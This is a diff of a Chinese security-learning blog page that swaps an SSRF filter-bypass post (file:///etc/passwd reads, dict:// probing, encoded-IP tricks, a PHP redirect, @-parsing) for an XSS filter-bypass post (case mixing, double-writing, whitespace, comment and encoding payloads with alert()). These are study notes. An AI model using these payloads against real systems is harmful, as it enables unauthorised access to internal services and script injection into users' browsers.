@@ -27,12 +27,12 @@
   <meta name="keywords" content="java,git,springcloud" />
 
 
-<link rel="canonical" href="https://hq185187.github.io/2023/04/30/SSRF/">
+<link rel="canonical" href="https://hq185187.github.io/2023/06/27/XSS%E5%AD%A6%E4%B9%A02/">
 
 
 
   <title>
-SSRF绕过 |
+XSS初学习2 - XSS |
 不良人天藏星 = welcome to my blog = 不良人总舵</title>
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -60,23 +60,23 @@ SSRF绕过 |
         <div id="brand">
           <div class="pjax">
           
-  <h1 itemprop="name headline">SSRF绕过
+  <h1 itemprop="name headline">XSS初学习2
   </h1>
   
 <div class="meta">
-  <span class="item" title="创建时间：2023-04-30 23:53:24">
+  <span class="item" title="创建时间：2023-06-27 11:12:36">
     <span class="icon">
       <i class="ic i-calendar"></i>
     </span>
     <span class="text">发表于</span>
-    <time itemprop="dateCreated datePublished" datetime="2023-04-30T23:53:24+08:00">2023-04-30</time>
+    <time itemprop="dateCreated datePublished" datetime="2023-06-27T11:12:36+08:00">2023-06-27</time>
   </span>
   <span class="item" title="本文字数">
     <span class="icon">
       <i class="ic i-pen"></i>
     </span>
     <span class="text">本文字数</span>
-    <span>820</span>
+    <span>1.4k</span>
     <span class="text">字</span>
   </span>
   <span class="item" title="阅读时长">
@@ -116,7 +116,7 @@ SSRF绕过 |
 
       </div>
       <div id="imgs" class="pjax">
-          <img src="/assets/11.jpg">
+          <img src="/assets/25.jpg">
       </div>
     </header>
     <div id="waves">
@@ -140,11 +140,13 @@ SSRF绕过 |
     
 <div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
 <i class="ic i-home"></i>
-<span><a href="/">首页</a></span>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/XSS/" itemprop="item" rel="index" title="分类于 XSS"><span itemprop="name">XSS</span></a>
+<meta itemprop="position" content="1" /></span>
 </div>
 
     <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
-  <link itemprop="mainEntityOfPage" href="https://hq185187.github.io/2023/04/30/SSRF/">
+  <link itemprop="mainEntityOfPage" href="https://hq185187.github.io/2023/06/27/XSS%E5%AD%A6%E4%B9%A02/">
 
   <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="image" content="/images/avatar.jpg">
@@ -159,38 +161,42 @@ SSRF绕过 |
   <div class="body md" itemprop="articleBody">
     
 
-    <h3 id="协议"><a class="markdownIt-Anchor" href="#协议">#</a> 协议:</h3>
-<p>1.file 协议</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br><span class="line">file:///C:/Users/30779/Documents/password.txt</span><br></pre></td></tr></table></figure>
-<p>2.dict: 字典服务器协议，能访问更多字典源</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=dict://主机/info</span><br><span class="line">可以获取目标服务器上运行的服务版本信息</span><br></pre></td></tr></table></figure>
-<p>3.gopher 协议：分布式的文档传递服务</p>
-<h3 id="绕过"><a class="markdownIt-Anchor" href="#绕过">#</a> 绕过</h3>
-<h4 id="1ip的限制"><a class="markdownIt-Anchor" href="#1ip的限制">#</a> 1.IP 的限制</h4>
-<p>(1)enclosed alphanumerics<br>
-① ② ⑦.⓿.⓿.①<br>
-(2) 短网址 (网址缩短)<br>
-<span class="exturl" data-url="aHR0cDovLzZkdS5pbi8=">http://6du.in/</span><br>
-<span class="exturl" data-url="aHR0cHM6Ly93d3cudXJsYy5jbi8=">https://www.urlc.cn/</span><br>
-(3) 句号代替点<br>
- 127。0。0。1<br>
- (4) 编码绕过<br>
- 127.0.0.1<br>
- 十六进制：7F000001    前面加 0x<br>
- 十进制：2130706433<br>
- 八进制：17700000001     前加 0, 可以加多个<br>
- (5) 省略绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Windows下0代表0.0.0.0</span><br><span class="line">Linux下代表127.0.0.1</span><br><span class="line">http://0代替127.0.0.1:</span><br><span class="line">ping 0 -c 4</span><br><span class="line">127.0.0.1之间的0也可以省路:</span><br><span class="line">ping 127.1 -c 4</span><br></pre></td></tr></table></figure>
-<p>(6) 302 跳转</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    header(&quot;Location: &#123;$_GET[&#x27;url&#x27;]&#125;&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>(7).@绕过<br>
-访问 <code>http://www.baidu.com@10.10.10.10</code>  与 <code>http://10.10.10.10</code>  请求是相同的<br>
- (8) 配置域名<br>
-加速我们手中有可控域名，可以将域名 A 记录指向想要请求的 IP 进行绕过<br>
-<span class="exturl" data-url="aHR0cDovL2V2aWwuZXhhbXBsZS5jb20="> evil.example.com</span> =&gt; 10.0.18.3</p>
-<p><mark>注意:php 的 url 解析:</mark></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a@127.0.0.1:80@baidu.com</span><br></pre></td></tr></table></figure>
-<p>可以实现检测 IP 时是正常的一个网站域名，而实际 curl 的是 127.0.0.1:80, 从而实现 ssrf</p>
+    <h2 id="xss绕过"><a class="markdownIt-Anchor" href="#xss绕过">#</a> XSS 绕过</h2>
+<h3 id="大小写绕过"><a class="markdownIt-Anchor" href="#大小写绕过">#</a> 大小写绕过</h3>
+<p>html 对大小写不敏感</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;123&quot;);&lt;/script&gt;</span><br><span class="line">等价于</span><br><span class="line">&lt;ScRipt&gt;ALERT(&quot;123&quot;);&lt;/scriPt&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="双写绕过"><a class="markdownIt-Anchor" href="#双写绕过">#</a> 双写绕过</h3>
+<p>如果 replace 函数过滤了某个关键字，就可以尝试双写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">假如过滤alert:</span><br><span class="line">&lt;script&gt;alalertert(&quot;123&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="空格回车tab绕过"><a class="markdownIt-Anchor" href="#空格回车tab绕过">#</a> 空格回车 TAB 绕过</h3>
+<p>js 解析到完整语句并且行尾存在换行符就可以省路分号，若解析确定不是完整语句，则会继续处理直到语句结束或出现分号<br>
+以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>为例:</p>
+<h4 id="空格绕过"><a class="markdownIt-Anchor" href="#空格绕过">#</a> 空格绕过</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;java script:alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="回车绕过"><a class="markdownIt-Anchor" href="#回车绕过">#</a> 回车绕过</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;java</span><br><span class="line">script:</span><br><span class="line">alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="tab绕过"><a class="markdownIt-Anchor" href="#tab绕过">#</a> TAB 绕过</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;java    script:alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="注释绕过"><a class="markdownIt-Anchor" href="#注释绕过">#</a> 注释绕过</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;123&quot;);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;scri&lt;!--1--&gt;pt&gt;alert(&quot;123&quot;);&lt;/sc&lt;!--1--&gt;ript&gt;</span><br></pre></td></tr></table></figure>
+<p>注意:<mark> 注释有两种方法表示</mark></p>
+<ol>
+<li><code>&lt;!--1--&gt;</code></li>
+<li>``&lt;!–1--!&gt;</li>
+</ol>
+<h3 id="编码绕过"><a class="markdownIt-Anchor" href="#编码绕过">#</a> 编码绕过</h3>
+<h4 id="unicode编码绕过"><a class="markdownIt-Anchor" href="#unicode编码绕过">#</a> unicode 编码绕过</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(&#x27;&lt;\u4e00&gt;&#x27;)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">\u4e00是一的Unicode编码</span><br><span class="line">等于</span><br><span class="line">&lt;a href=&quot;javascript:alert(&#x27;&lt;一&gt;&#x27;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="url编码绕过"><a class="markdownIt-Anchor" href="#url编码绕过">#</a> url 编码绕过</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%61%6C%65%72%74%28%22%78%73%73%22%29%3B;&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">等价于:</span><br><span class="line">&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="ascii码"><a class="markdownIt-Anchor" href="#ascii码">#</a> ascii 码</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">等价</span><br><span class="line">&lt;a href=&quot;javascript:97,108,101,114,116,40,34,120,115,115,34,41,59&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>还有 hrml 实体编码绕过，base64 编码，十进制八进制绕过等等<br>
+过滤单双引号用反引号<code>``</code>替代</p>
+<p>更多的绕过看这篇<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUwODU0NzkwL2FydGljbGUvZGV0YWlscy8xMjQyOTcwNDY=">绕过大全</span><br>
+关于编码绕过看<span class="exturl" data-url="aHR0cHM6Ly9zYXVjZXItbWFuLmNvbS9pbmZvcm1hdGlvbl9zZWN1cml0eS8xMDMuaHRtbA==">这篇</span></p>
 
   </div>
 
@@ -202,7 +208,7 @@ SSRF绕过 |
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-05-07 19:15:37" itemprop="dateModified" datetime="2023-05-07T19:15:37+08:00">2023-05-07</time>
+    <time title="修改时间：2023-06-27 11:13:03" itemprop="dateModified" datetime="2023-06-27T11:13:03+08:00">2023-06-27</time>
   </span>
 </div>
 
@@ -215,7 +221,7 @@ SSRF绕过 |
   </li>
   <li class="link">
     <strong>本文链接：</strong>
-    <a href="https://hq185187.github.io/2023/04/30/SSRF/" title="SSRF绕过">https://hq185187.github.io/2023/04/30/SSRF/</a>
+    <a href="https://hq185187.github.io/2023/06/27/XSS%E5%AD%A6%E4%B9%A02/" title="XSS初学习2">https://hq185187.github.io/2023/06/27/XSS学习2/</a>
   </li>
   <li class="license">
     <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
@@ -234,22 +240,14 @@ SSRF绕过 |
     <div class="item left">
       
 
-  <a href="/2023/04/30/md5/" itemprop="url" rel="prev" data-background-image="&#x2F;assets&#x2F;5.jpg" title="MD5绕过总结">
+  <a href="/2023/06/26/XSS%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="prev" data-background-image="&#x2F;assets&#x2F;24.jpg" title="XSS初学习1">
   <span class="type">上一篇</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>MD5绕过总结</h3>
+  <span class="category"><i class="ic i-flag"></i> XSS</span>
+  <h3>XSS初学习1</h3>
   </a>
 
     </div>
     <div class="item right">
-      
-
-  <a href="/2023/05/02/SSTI/" itemprop="url" rel="next" data-background-image="&#x2F;assets&#x2F;14.jpg" title="SSTI总结">
-  <span class="type">下一篇</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>SSTI总结</h3>
-  </a>
-
     </div>
 </div>
 
@@ -266,9 +264,12 @@ SSRF绕过 |
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.</span> <span class="toc-text"> 协议:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text"> 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1ip%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-number">2.1.</span> <span class="toc-text"> 1.IP 的限制</span></a></li></ol></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#xss%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text"> XSS 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text"> 大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text"> 双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E5%9B%9E%E8%BD%A6tab%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text"> 空格回车 TAB 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 空格绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9E%E8%BD%A6%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 回车绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tab%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.</span> <span class="toc-text"> TAB 绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text"> 注释绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text"> 编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#unicode%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.1.</span> <span class="toc-text"> unicode 编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#url%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.2.</span> <span class="toc-text"> url 编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ascii%E7%A0%81"><span class="toc-number">1.5.3.</span> <span class="toc-text"> ascii 码</span></a></li></ol></li></ol></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2023/06/26/XSS%E5%AD%A6%E4%B9%A0/" rel="bookmark" title="XSS初学习1">XSS初学习1</a></li><li class="active"><a href="/2023/06/27/XSS%E5%AD%A6%E4%B9%A02/" rel="bookmark" title="XSS初学习2">XSS初学习2</a></li>
+        </ul>
       </div>
       <div class="overview panel" data-title="站点概览">
         <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -339,12 +340,10 @@ SSRF绕过 |
 
   <ul id="quick">
     <li class="prev pjax">
-        <a href="/2023/04/30/md5/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
-        <a href="/2023/05/02/SSTI/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
@@ -366,6 +365,42 @@ SSRF绕过 |
   <li class="item">
     
 <div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/06/23/NSS%20Round13/" title="NSS Round 13">NSS Round 13</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/05/02/ssti-labs/" title="SSTI-Labs">SSTI-Labs</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/unserialize-labs/" title="Unserialize-labs">Unserialize-labs</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/05/14/LitCTF2023/" title="LitCTF2023">LitCTF2023</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
 <a href="/categories/NSSCTF/" title="分类于 NSSCTF精选">NSSCTF精选</a>
 </div>
 
@@ -378,7 +413,17 @@ SSRF绕过 |
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/06/23/NSS%20Round13/" title="NSS Round 13">NSS Round 13</a></span>
+    <span><a href="/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/" title="无字母数字rce">无字母数字rce</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/NSSCTF/" title="分类于 NSSCTF精选">NSSCTF精选</a>
+</div>
+
+    <span><a href="/2023/04/26/nessctf/" title="NSSCTF1">NSSCTF1</a></span>
   </li>
 
       
@@ -387,7 +432,7 @@ SSRF绕过 |
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/05/10/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="原型链污染">原型链污染</a></span>
+    <span><a href="/2023/04/30/md5/" title="MD5绕过总结">MD5绕过总结</a></span>
   </li>
 
       
@@ -396,17 +441,7 @@ SSRF绕过 |
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="命令执行漏洞及绕过方法">命令执行漏洞及绕过方法</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/sql/" title="分类于 SQL注入">SQL注入</a>
-</div>
-
-    <span><a href="/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/" title="Mysql主从复制">Mysql主从复制</a></span>
+    <span><a href="/2023/05/03/request%E5%BA%93/" title="requests学习">requests学习</a></span>
   </li>
 
       
@@ -415,44 +450,7 @@ SSRF绕过 |
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/30/SSRF/" title="SSRF绕过">SSRF绕过</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/06/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Phar反序列化学习">Phar反序列化学习</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/XSS/" title="分类于 XSS">XSS</a>
-</div>
-
-    <span><a href="/2023/06/26/XSS%E5%AD%A6%E4%B9%A0/" title="XSS初学习1">XSS初学习1</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/06/08/%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="原生类反序列化学习">原生类反序列化学习</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/05/02/SSTI/" title="SSTI总结">SSTI总结</a></span>
+    <span><a href="/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="php反序列化漏洞学习">php反序列化漏洞学习</a></span>
   </li>
 
   </ul>
@@ -495,7 +493,7 @@ SSRF绕过 |
   </div>
 <script data-config type="text/javascript">
   var LOCAL = {
-    path: '2023/04/30/SSRF/',
+    path: '2023/06/27/XSS学习2/',
     favicon: {
       show: "（●´3｀●）やれやれだぜ",
       hide: "(´Д｀)大変だ！"
